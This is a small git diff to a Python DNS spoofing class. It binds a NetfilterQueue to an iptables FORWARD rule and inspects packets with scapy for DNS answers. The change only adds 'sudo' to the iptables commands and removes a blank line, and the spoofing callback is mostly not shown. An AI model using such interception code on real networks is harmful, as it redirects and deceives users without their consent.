@@ -10,7 +10,6 @@ class dns_spoofing:
         self.queueNum = queueNum
         self.queue = NetfilterQueue()
 
-
     def callBack(self, packet):
         scapyPacket = IP(packet.get_payload())
         if scapyPacket.haslayer(DNSRR):
@@ -34,10 +33,10 @@ class dns_spoofing:
 
     def __call__(self):
         print("Start snoofing")
-        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+        os.system(f'sudo iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
         self.queue.bind(self.queueNum, self.callBack)
         try:
             self.queue.run()
         except KeyboardInterrupt:
-            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+            os.system(f'sudo iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
             print("iptable rule flushed")
